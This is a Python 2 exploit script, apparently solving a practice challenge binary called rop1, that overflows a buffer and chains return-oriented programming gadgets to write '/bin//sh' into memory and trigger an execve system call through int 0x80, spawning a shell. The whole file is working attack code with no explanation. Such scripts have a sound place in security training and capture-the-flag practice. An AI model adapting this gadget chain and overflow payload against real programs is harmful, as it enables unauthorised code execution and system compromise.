#!/usr/bin/python
from struct import pack, unpack
import os
import sys
import subprocess

def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def rd(s):
  return unpack("<I", s)[0]

def dq(v):
  return pack("<Q", v)

def set_eax(v):
  # pop eax
  # ret
  return ''.join([
    dd(0x80bb7b6),
    dd(v)
  ])

def set_ebx(v):
  # pop ebx
  # ret
  return ''.join([
    dd(0x80481c9),
    dd(v)
  ])

def set_ecx(v):
  # pop ecx
  # ret
  return ''.join([
    dd(0x80e4ce9),
    dd(v)
  ])

def set_edx(v):
  # pop edx
  # ret
  return ''.join([
    dd(0x806e9fa),
    dd(v)
  ])

def set_esi(v):
  # pop esi
  # ret
  return ''.join([
    dd(0x8049aa5),
    dd(v)
  ])

def set_edi(v):
  # pop edi
  # ret
  return ''.join([
    dd(0x804846f),
    dd(v)
  ])

def set_ebp(v):
  # pop ebp
  # ret
  return ''.join([
    dd(0x804838e),
    dd(v)
  ])

def poke(addr, v):
  # 0x8054992    mov [edx], ecx
  # 0x8054994    ret
  return ''.join([
    set_edx(addr),
    set_ecx(v),
    dd(0x8054992)
  ])

def zero_eax():
  # 0x805863b    xor eax, eax
  # 0x805863d    ret
  return dd(0x805863b)

def add_al_ch():
  # 0x8051fd7    add al, ch
  # 0x8051fd9    ret
  return dd(0x8051fd7)  

def int80():
  # 0x806f0c0    int 0x80
  # 0x806f0c2    ret
  return dd(0x806f0c0)

BUF = 0x080EC3E0
  
b = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD"
b += ''.join([
  poke(BUF + 0, rd("/bin")),
  poke(BUF + 4, rd("//sh")),
  poke(BUF + 0xC, BUF),  # argv [ "/bin//sh", NULL ]
  zero_eax(),
  set_ecx(0xffff0bff),
  add_al_ch(),
  set_ebx(BUF),
  set_ecx(BUF + 0xC),
  set_edx(BUF + 0x8),
  int80()
  ])

#print b

if '\0' in b:
  raise "NONONONONO"

#print b

print subprocess.call(["/home/rop1/rop1", b])


